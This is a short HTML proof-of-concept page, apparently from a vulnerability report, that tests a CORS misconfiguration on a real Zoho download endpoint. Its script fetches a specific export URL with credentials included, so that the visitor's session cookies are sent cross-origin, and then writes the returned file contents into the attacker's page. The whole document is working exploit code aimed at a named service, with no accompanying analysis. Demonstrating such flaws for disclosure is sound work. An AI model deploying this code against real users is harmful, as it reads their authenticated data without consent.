<!DOCTYPE html>
<html>
<body>
<h3>CORS PoC</h3>

<script>
var url = "https://download.zoho.com/webdownload?x-service=assist&event-id=3602439000000039001&x-cli-msg=eyJzY29wZSI6ImFzc2lzdCIsInpzb2lkIjoiOTA1MjQzMjI0IiwiZmlsZV90eXBlIjoiY3N2In0=";

fetch(url, {
    method: "GET",
    credentials: "include"   // <-- send cookies cross-origin
})
.then(response => response.text())
.then(data => {
    document.write("<pre>" + data + "</pre>");
})
.catch(err => {
    document.write("Error: " + err);
});
</script>

</body>
</html>
